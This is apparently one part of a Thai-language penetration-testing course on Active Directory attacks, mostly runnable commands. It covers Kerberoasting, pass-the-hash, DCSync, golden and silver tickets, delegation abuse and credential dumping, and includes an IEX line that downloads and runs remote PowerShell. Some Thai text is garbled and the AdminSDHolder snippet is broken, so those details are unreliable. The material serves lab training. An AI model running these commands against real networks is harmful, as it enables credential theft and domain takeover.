# Part 58: Active Directory Advanced Attacks (การโจมตี AD ขั้นสูง)

## สารบัญ
1. [Active Directory Fundamentals ทบทวน](#1-active-directory-fundamentals)
2. [Domain Enumeration เชิงลึก](#2-domain-enumeration)
3. [Kerberoasting และ AS-REPRoasting](#3-kerberoasting-และ-as-reproasting)
4. [Pass-the-Hash / Pass-the-Ticket](#4-pass-the-hash--pass-the-ticket)
5. [DCSync Attack](#5-dcsync-attack)
6. [Golden และ Silver Tickets](#6-golden-และ-silver-tickets)
7. [BloodHound Attack Path Analysis](#7-bloodhound-attack-path-analysis)
8. [Domain Privilege Escalation](#8-domain-privilege-escalation)
9. [Forest Attacks](#9-forest-attacks)
10. [แบบฝึกหัด Lab](#10-แบบฝึกหัด-lab)

---

## 1. Active Directory Fundamentals

### 1.1 AD Architecture

```
Active Directory Hierarchy:

Forest (EXAMPLE.COM)
└── Tree (EXAMPLE.COM)
    └── Domain (corp.example.com)
        ├── Domain Controllers (DC)
        ├── Organizational Units (OU)
        ├── Users
        ├── Groups
        └── Computers

Key Components:
- LDAP: โปรโตคอลสำหรับ query AD
- Kerberos: authentication protocol (port 88)
- DNS: ใช้หา DC
- NTLM: legacy authentication
- SMB: file sharing (port 445)
- LDAP: directory service (port 389, 636)
- WinRM: remote management (port 5985, 5986)

Kerberos Flow:
1. Client -> KDC: AS-REQ (username)
2. KDC -> Client: AS-REP (TGT encrypted)
3. Client -> KDC: TGS-REQ (TGT + service request)
4. KDC -> Client: TGS-REP (service ticket)
5. Client -> Server: AP-REQ (service ticket)
6. Server authenticates and responds
```

### 1.2 Basic Enumeration Commands

```powershell
# Windows: Basic AD info
net user /domain              # ดู users
net group /domain             # ดู groups
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# ดู domain info
echo %userdomain%
echo %logonserver%
nltest /domain_trusts
nltest /dclist:DOMAIN

# PowerShell AD module
Get-ADDomain
Get-ADForest
Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled
Get-ADGroup -Filter * | Select-Object Name, GroupScope
Get-ADComputer -Filter * | Select-Object Name, OperatingSystem

# สอบถาม current user ใน DA
(New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

---

## 2. Domain Enumeration เชิงลึก

### 2.1 PowerView Enumeration

```powershell
# โหลด PowerView
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# Domainในโซน
Get-Domain
Get-DomainController
Get-DomainController -Domain corp.example.com  # remote domain

# Users
Get-DomainUser
Get-DomainUser -Identity alice  # specific user
Get-DomainUser | Where-Object {$_.admincount -eq 1}  # admin users
Get-DomainUser -SPN  # users with SPNs (Kerberoasting)
Get-DomainUser -PreauthNotRequired  # AS-REPRoasting targets

# Groups
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins" -Recurse  # nested groups

# Computers
Get-DomainComputer
Get-DomainComputer -Unconstrained  # unconstrained delegation
Get-DomainComputer -TrustedToAuth   # constrained delegation

# Shares
Find-DomainShare
Find-DomainShare -CheckShareAccess  # เฉพาะที่เข้าถึงได้
Find-InterestingDomainShareFile  # หาไฟล์ที่น่าสนใจ

# หา Local Admins บนเครื่อง domain
Find-LocalAdminAccess  # หาเครื่องที่ current user เป็น local admin

# Trusts
Get-DomainTrust
Get-ForestTrust

# หา GPO
Get-DomainGPO
Get-DomainGPO | Where-Object {$_.displayName -like "*policy*"}

# ACLs
Find-InterestingDomainAcl -ResolveGUIDs  # หา interesting ACLs
Get-DomainObjectAcl -Identity alice -ResolveGUIDs
```

### 2.2 LDAP และ BloodHound Ingestor

```bash
# ldapsearch จาก Linux
ldapsearch -H ldap://10.10.10.10 -x \
    -b 'DC=CORP,DC=LOCAL' \
    '(objectClass=user)' \
    sAMAccountName mail

# ดู DC info
ldapsearch -H ldap://10.10.10.10 -x \
    -b 'DC=CORP,DC=LOCAL' \
    '(userAccountControl:1.2.840.113556.1.4.803:=8192)'  # Domain Controllers

# หา users ที่ไม่ต้องการ pre-auth (AS-REPRoast)
ldapsearch -H ldap://10.10.10.10 -x \
    -b 'DC=CORP,DC=LOCAL' \
    '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'

# Impacket GetADUsers
python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py \
    -all CORP.LOCAL/user:password@10.10.10.10

# SharpHound (BloodHound collector)
# Windows
.\SharpHound.exe -c All --zipfilename bloodhound.zip
.\SharpHound.exe -c DCOnly --zipfilename dc_only.zip

# BloodHound Python (from Linux)
pip3 install bloodhound
bloodhound-python -u user -p password -d CORP.LOCAL -ns 10.10.10.10 -c all
```

---

## 3. Kerberoasting และ AS-REPRoasting

### 3.1 Kerberoasting

```bash
# หรับใช้: user accounts ที่มี SPNs
# Service accounts มักมี SPNs

# Impacket GetUserSPNs
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
    CORP.LOCAL/user:password \
    -dc-ip 10.10.10.10 \
    -outputfile kerberoast_hashes.txt

# PowerView
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv kerberoast.csv

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt
.\Rubeus.exe kerberoast /user:svcaccount /outfile:hashes.txt

# Crack hashes
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John
john --format=krb5tgs kerberoast_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### 3.2 AS-REPRoasting

```bash
# หรับใช้: accounts ที่มี "Do not require Kerberos preauthentication"

# Impacket GetNPUsers
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py \
    CORP.LOCAL/ \
    -usersfile users.txt \
    -dc-ip 10.10.10.10 \
    -format hashcat

# สำหรับ authenticated user
python3 GetNPUsers.py \
    CORP.LOCAL/user:password \
    -dc-ip 10.10.10.10 \
    -format hashcat \
    -outputfile asrep_hashes.txt

# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 4. Pass-the-Hash / Pass-the-Ticket

### 4.1 Pass-the-Hash (PtH)

```bash
# ใช้ NTLM hash แทนรหัสผ่าน

# Impacket psexec
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
    -hashes ':NTLM_HASH' administrator@10.10.10.10

# SMBExec
python3 /usr/share/doc/python3-impacket/examples/smbexec.py \
    -hashes ':NTLM_HASH' CORP/administrator@10.10.10.10

# WMIExec
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
    -hashes ':NTLM_HASH' CORP/administrator@10.10.10.10

# CrackMapExec
cme smb 10.10.10.0/24 -u administrator -H ':NTLM_HASH' --continue-on-success
cme smb 10.10.10.10 -u administrator -H ':NTLM_HASH' -x 'whoami'

# Evil-WinRM
evil-winrm -i 10.10.10.10 -u administrator -H 'NTLM_HASH'

# Mimikatz PtH
mimikatz.exe
sekurlsa::pth /user:administrator /domain:CORP /ntlm:NTLM_HASH /run:cmd.exe
```

### 4.2 Pass-the-Ticket (PtT)

```powershell
# สร้าง Kerberos ticket จาก hash

# Mimikatz: dump tickets
mimikatz.exe
sekurlsa::tickets /export  # export tickets
sekurlsa::logonpasswords   # dump credentials

# Rubeus: dump tickets
.\Rubeus.exe dump /service:krbtgt /nowrap  # dump TGTs
.\Rubeus.exe dump /luid:0x3e7  # specific LUID

# Import ticket
.\Rubeus.exe ptt /ticket:ticket.kirbi
mimikatz.exe "kerberos::ptt ticket.kirbi"

# ตรวจสอบ
klist  # ดู active tickets
```

### 4.3 Overpass-the-Hash

```powershell
# แปลง NTLM hash เป็น Kerberos TGT

# Mimikatz
mimikatz.exe
sekurlsa::pth /user:alice /domain:CORP /ntlm:NTLM_HASH /run:powershell.exe

# ใน PowerShell ใหม่ใช้ command และ ticket จะถูกสร้าง
dir \\dc01\C$  # access remote share (triggers TGT request)
klist           # ดู Kerberos ticket

# Rubeus
.\Rubeus.exe asktgt /user:alice /rc4:NTLM_HASH /ptt  # request TGT
```

---

## 5. DCSync Attack

### 5.1 DCSync ด้วย Mimikatz

```powershell
# DCSync: จำลองเป็น DC เพื่อดึง credentials
# ต้องการ: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All

# Mimikatz
mimikatz.exe
lsadump::dcsync /domain:CORP.LOCAL /user:krbtgt
lsadump::dcsync /domain:CORP.LOCAL /user:administrator
lsadump::dcsync /domain:CORP.LOCAL /all /csv  # dump all

# Impacket secretsdump
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
    CORP.LOCAL/administrator:'password'@10.10.10.10

# ใช้ hash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
    -hashes ':NTLM_HASH' CORP.LOCAL/administrator@10.10.10.10

# CrackMapExec
cme smb 10.10.10.10 -u administrator -p 'password' --ntds
cme smb 10.10.10.10 -u administrator -p 'password' --ntds --users  # with usernames
```

### 5.2 NTDS.dit Extraction

```powershell
# สำเนาโดยตรง

# ntdsutil
ntdsutil
"activate instance ntds"
ifm
"create full C:\ntds_backup"
q
q

copy C:\ntds_backup\Active\ Directory\ntds.dit C:\temp\
copy C:\Windows\System32\config\SYSTEM C:\temp\

# VSS (Volume Shadow Copy)
wmic shadowcopy call create Volume=C:\
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
```

```bash
# ถอดรหัสจาก NTDS.dit (Linux)
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
    -ntds /tmp/ntds.dit \
    -system /tmp/SYSTEM \
    LOCAL

# ตัวอย่าง output:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:NTLM_HASH:::
```

---

## 6. Golden และ Silver Tickets

### 6.1 Golden Ticket

```powershell
# Golden Ticket: สร้าง TGT อีกครั้งด้วย krbtgt hash
# ต้องการ: krbtgt NTLM hash, Domain SID, Domain FQDN

# Step 1: หา krbtgt hash
mimikatz.exe
lsadump::dcsync /domain:CORP.LOCAL /user:krbtgt
# NTLM hash: KRBTGT_HASH
# หรือจาก DC
whoami /user  # ดู Domain SID
# S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX

# Step 2: สร้าง Golden Ticket
mimikatz.exe
kerberos::golden \
    /domain:CORP.LOCAL \
    /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
    /krbtgt:KRBTGT_HASH \
    /user:Administrator \
    /groups:512,519 \
    /ptt  # inject into current session

# Step 3: ใช้ ticket
dir \\DC01\C$  # access DC filesystem
psexec.exe \\DC01 cmd.exe

# Rubeus
.\Rubeus.exe golden \
    /rc4:KRBTGT_HASH \
    /domain:CORP.LOCAL \
    /sid:S-1-5-21-... \
    /user:FakeAdmin \
    /ptt
```

### 6.2 Silver Ticket

```powershell
# Silver Ticket: สร้าง TGS สำหรับบริการใดบริการหนึ่ง
# ต้องการ: service account NTLM hash, Domain SID, SPN

# Silver Ticket สำหรับ CIFS (SMB) service
mimikatz.exe
kerberos::golden \
    /domain:CORP.LOCAL \
    /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
    /target:DC01.CORP.LOCAL \
    /service:cifs \
    /rc4:COMPUTER_ACCOUNT_HASH \
    /user:Administrator \
    /ptt

# เข้าถึง file share
dir \\DC01.CORP.LOCAL\C$

# Silver Ticket สำหรับ HTTP service
mimikatz.exe
kerberos::golden \
    /domain:CORP.LOCAL \
    /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
    /target:webserver.CORP.LOCAL \
    /service:http \
    /rc4:SERVICE_HASH \
    /user:Administrator \
    /ptt
```

### 6.3 Diamond Ticket

```powershell
# Diamond Ticket: แก้ไข TGT ที่มีอยู่แล้วโดยไม่สร้างใหม่
# ลด detection เพราะใช้ legitimate TGT

# Rubeus
.\Rubeus.exe diamond \
    /krbkey:KRBTGT_HASH \
    /user:alice \
    /password:Password1 \
    /enctype:rc4 \
    /ticketuser:administrator \
    /domain:CORP.LOCAL \
    /dc:DC01.CORP.LOCAL \
    /ptt
```

---

## 7. BloodHound Attack Path Analysis

### 7.1 BloodHound Setup

```bash
# ติดตั้ง Neo4j และ BloodHound
sudo apt install neo4j
sudo neo4j start

# BloodHound
wget https://github.com/BloodHoundAD/BloodHound/releases/latest/download/BloodHound-linux-x64.zip
unzip BloodHound-linux-x64.zip
./BloodHound-linux-x64/BloodHound

# Default credentials: neo4j/neo4j (change on first login)

# Import data
# BloodHound GUI: Drag and drop .zip file from SharpHound
```

### 7.2 BloodHound Queries

```cypher
-- Shortest path to Domain Admin
MATCH (n:User {name:'ALICE@CORP.LOCAL'}),
      (m:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}),
      p=shortestPath((n)-[*1..]->(m))
RETURN p

-- หา users ที่เป็น local admin บน computer
MATCH p=(m:User)-[:AdminTo]->(n:Computer)
RETURN m, n

-- หา computers ที่มี Unconstrained Delegation
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c

-- หา Kerberoastable users
MATCH (n:User {hasspn:true})
WHERE n.enabled=true
RETURN n

-- ACL Abuse paths
MATCH p=(m)-[r:GenericAll|WriteDACL|WriteOwner|GenericWrite|ForceChangePassword]->(n:User)
RETURN m, r, n

-- หา users ที่มี DCSync rights
MATCH p=(n)-[:DCSync]->(m:Domain {name: 'CORP.LOCAL'})
RETURN p

-- Path from owned users to DA
MATCH (n:User {owned:true}),
      (m:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}),
      p=shortestPath((n)-[*1..]->(m))
RETURN p
```

---

## 8. Domain Privilege Escalation

### 8.1 ACL Abuse

```powershell
# GenericAll หรือ GenericWrite บน user/group
# สามารถเปลี่ยนรหัสผ่าน

# พายูแล์ และเปลี่ยน password เพื่อเข้าถึง
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)

# WriteDACL: เพิ่ม DCSync rights
Add-DomainObjectAcl -TargetIdentity 'DC=CORP,DC=LOCAL' -PrincipalIdentity hacker_user -Rights DCSync

# ForceChangePassword
$NewPassword = ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force
Set-DomainUserPassword -Identity target_user -AccountPassword $NewPassword

# AddMember บน group
Add-DomainGroupMember -Identity 'Domain Admins' -Members hacker_user

# GenericWrite + SPN สำหรับ Kerberoasting
Set-DomainObject -Identity target_user -Set @{serviceprincipalname='http/evil'}
# แล้ว Kerberoast
Get-DomainSPNTicket -SPN 'http/evil' | Format-Hashcat
```

### 8.2 Unconstrained Delegation

```powershell
# หา computers ที่มี unconstrained delegation
Get-DomainComputer -Unconstrained

# เมื่อ admin connect ไปยัง computer
# TGT จะถูกเก็บไว้ใน memory

# ดู tickets ใน memory
mimikatz.exe
sekurlsa::tickets /export  # export all tickets

# Printer Bug (SpoolSample)
# บังคับให้ DC authenticate ไปยัง server
.\SpoolSample.exe DC01.CORP.LOCAL ATTACKER.CORP.LOCAL

# Rubeus monitor เพื่อรอ TGT
.\Rubeus.exe monitor /targetuser:DC01$ /interval:5 /nowrap

# เมื่อได้ TGT
.\Rubeus.exe ptt /ticket:BASE64_TICKET
mimikatz.exe "lsadump::dcsync /domain:CORP.LOCAL /user:administrator"
```

### 8.3 Constrained Delegation Abuse

```powershell
# หา accounts ที่มี constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# สร้าง ticket สำหรับ service เดิม
Rubeus asktgt /user:svc_account /rc4:NTLM_HASH /outfile:svc_tgt.kirbi

# S4U2Self + S4U2Proxy
.\Rubeus.exe s4u \
    /ticket:svc_tgt.kirbi \
    /impersonateuser:administrator \
    /msdsspn:cifs/DC01.CORP.LOCAL \
    /ptt

# เข้าถึง
dir \\DC01.CORP.LOCAL\C$
```

### 8.4 Resource-Based Constrained Delegation (RBCD)

```powershell
# RBCD Attack: เมื่อเรามี GenericWrite บน computer object

# Step 1: สร้าง fake computer account
New-MachineAccount -MachineAccount FakePC -Password (ConvertTo-SecureString 'Pass@word1' -AsPlainText -Force)

# ดู SID
$fakePcSid = Get-DomainComputer FakePC -Properties objectsid | Select -Expand objectsid

# Step 2: Set msDS-AllowedToActOnBehalfOfOtherIdentity บน target
$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$fakePcSid)"
$sdBytes = New-Object Byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($sdBytes, 0)
Get-DomainComputer TargetPC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sdBytes}

# Step 3: S4U attack
.\Rubeus.exe s4u \
    /user:FakePC$ \
    /rc4:FakePC_HASH \
    /impersonateuser:administrator \
    /msdsspn:cifs/TargetPC.CORP.LOCAL \
    /ptt
```

---

## 9. Forest Attacks

### 9.1 Cross-Forest Trust Abuse

```powershell
# ดู trusts
Get-ForestTrust
Get-DomainTrust

# SID Filtering bypass (ถ้าปิด
# ExternalTrust = SID filtering ON by default
# ForestTransitiveTrust = SID filtering OFF by default

# เวลา trust ไม่มี SID filtering
# สร้าง golden ticket พร้อม extra SID
mimikatz.exe
kerberos::golden \
    /domain:CHILD.CORP.LOCAL \
    /sid:S-1-5-21-CHILD-SID \
    /sids:S-1-5-21-PARENT-SID-519 \
    /krbtgt:CHILD_KRBTGT_HASH \
    /user:FakeAdmin \
    /ptt

# Access parent domain
dir \\PARENT-DC\C$
```

### 9.2 AdminSDHolder Abuse

```powershell
# AdminSDHolder: template ACL สำหรับ protected groups
# ถ้าเพิ่ม ACE บน AdminSDHolder
# SDProp process จะคัดลอกไปยัง protected users ทุก 60 นาที

# เพิ่ม GenericAll ให้ hacker_user บน AdminSDHolder
Add-DomainObjectAcl \
    -TargetIdentity 'AdminSDHolder' \
    -PrincipalIdentity hacker_user \
    -Rights All

# รอ 60 นาที (SDProp) หรือเรียก ด้วย
$session = New-PSSession -ComputerName DC01
Invoke-Command -Session $session { 
    Import-Module ActiveDirectory
    $SDDL = (Get-ADObject -SearchBase "CN=AdminSDHolder,CN=System,DC=CORP,DC=LOCAL" -Filter *).nTSecurityDescriptor.Sddl
    $SDDL += '(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;DA)'
}

# เมื่อ SDProp ทำงาน
hacker_user จะมี GenericAll บน Domain Admins!
```

---

## 10. แบบฝึกหัด Lab

### Lab 1: Kerberoasting Chain

```bash
# Setup: GOAD (Game of Active Directory) หรือ TCM AD Lab

# Step 1: Scan DC
nmap -p 88,389,445,3268 10.10.10.10

# Step 2: หา Kerberoastable accounts
python3 GetUserSPNs.py CORP.LOCAL/user:password -dc-ip 10.10.10.10 -outputfile kerb.txt

# Step 3: Crack hash
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt

# Step 4: ใช้ credential
wmiexec.py CORP.LOCAL/svc_account:cracked_password@10.10.10.10

# Step 5: Escalate ถ้า svc_account มีสิทธิ์
mimikatz.exe
lsadump::dcsync /domain:CORP.LOCAL /user:administrator
```

### Lab 2: BloodHound Attack Path

```bash
# Step 1: เก็บข้อมูล
# Windows: SharpHound
# Linux: bloodhound-python -u user -p pass -d CORP.LOCAL -ns 10.10.10.10 -c all

# Step 2: เปิด BloodHound และ import data

# Step 3: Run queries
# - Shortest Paths to Domain Admins
# - Find Kerberoastable Users
# - Find AS-REP Roastable Users
# - Find Computers where Domain Users are Local Admin

# Step 4: ตาม attack path
# BloodHound จะแสดง steps เส้น attack path
# e.g. alice -> GenericAll -> svc_account -> AdminTo -> DC01
```

### สรุป AD Attack Techniques

| เทคนิค | เซใช้จาก | ต้องการ |
|--------|-----------|------|
| Kerberoasting | Domain User | Service account SPNs |
| AS-REPRoasting | ประสงค์เป็น Anonymous | No preauth required |
| Pass-the-Hash | Local Admin | NTLM hash |
| Pass-the-Ticket | Local SYSTEM | Kerberos ticket |
| DCSync | Domain Admin | DS-Replication rights |
| Golden Ticket | Domain Admin | krbtgt hash + Domain SID |
| Silver Ticket | Local Admin | Service account hash |
| RBCD | GenericWrite on computer | Writable attribute |
| Unconstrained Delegation | Local Admin on target | DC authentication |

---

← [Part 57: API Security](Part-57-API-Security.md) | [Part 59: Cloud Security Advanced](Part-59-Cloud-Advanced.md) →
